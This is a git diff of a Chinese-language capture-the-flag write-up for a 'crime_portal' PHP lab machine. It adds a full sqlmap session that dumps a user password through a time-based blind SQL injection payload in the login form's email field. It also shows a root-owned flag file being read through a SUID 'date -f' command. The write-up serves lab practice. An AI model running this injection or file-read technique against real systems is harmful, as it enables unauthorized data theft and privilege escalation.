@@ -214,8 +214,64 @@ back-end DBMS: MySQL >= 5.0.12
 没有明显的结果回显，也没有报错，只能上时间盲注，可以得到用户密码
 
 ```shell
-# Exercise 1v1 模式下仅 15min 不足以跑完时间盲注，请求时间不稳定
-......
+┌──(randark㉿kali)-[~]
+└─$ sqlmap -u 10.10.110.101/police/userlogin.php --form --batch -D crime_portal -T user -C u_pass --dump --fresh-queries --time-sec=1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:06:02 /2025-04-12/
+
+[18:06:02] [INFO] testing connection to the target URL
+[18:06:02] [INFO] searching for forms
+[1/1] Form:
+POST http://10.10.110.101/police/userlogin.php
+POST data: email=&password=&s=
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: email=&password=&s=] (Warning: blank fields detected): email=&password=&s=
+do you want to fill blank fields with random values? [Y/n] Y
+[18:06:03] [INFO] resuming back-end DBMS 'mysql' 
+[18:06:03] [INFO] using '/home/randark/.local/share/sqlmap/output/results-04122025_0606pm.csv' as the CSV results file in multiple targets mode
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=rlbmfgl7h3c...qdhlbke0kn'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=npai' AND (SELECT 1251 FROM (SELECT(SLEEP(1)))QMQw) AND 'Vdae'='Vdae&password=YrVE&s=vpfQ
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:06:03] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41, PHP
+back-end DBMS: MySQL >= 5.0.12
+[18:06:03] [INFO] fetching entries of column(s) 'u_pass' for table 'user' in database 'crime_portal'
+[18:06:03] [INFO] fetching number of column(s) 'u_pass' entries for table 'user' in database 'crime_portal'
+[18:06:03] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                 
+[18:06:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+1
+[18:06:15] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                        
+cPvTFWVo1G
+Database: crime_portal
+Table: user
+[1 entry]
++------------+
+| u_pass     |
++------------+
+| cPvTFWVo1G |
++------------+
+
+[18:07:26] [INFO] table 'crime_portal.`user`' dumped to CSV file '/home/randark/.local/share/sqlmap/output/10.10.110.101/dump/crime_portal/user.csv'
+[18:07:26] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/randark/.local/share/sqlmap/output/results-04122025_0606pm.csv'
+
+[*] ending @ 18:07:26 /2025-04-12/
 ```
 
 ## 提权至 root
@@ -264,6 +320,6 @@ eddie@htb:/var/www/html/police$ find / -perm -u=s -type f 2>/dev/null
 直接使用`date`构造文件读取
 
 ```shell
-eddie@htb:/var/www/html/police$ date -f /root/flag.txt
-date: invalid date ‘d18af8fa1a47ebe4e24a2b0acaa31aac’
+(remote) eddie@htb:/home/eddie$ date -f /root/flag.txt
+date: invalid date ‘8c19c5d86369eb35fdfeefe468281fa8’
 ```
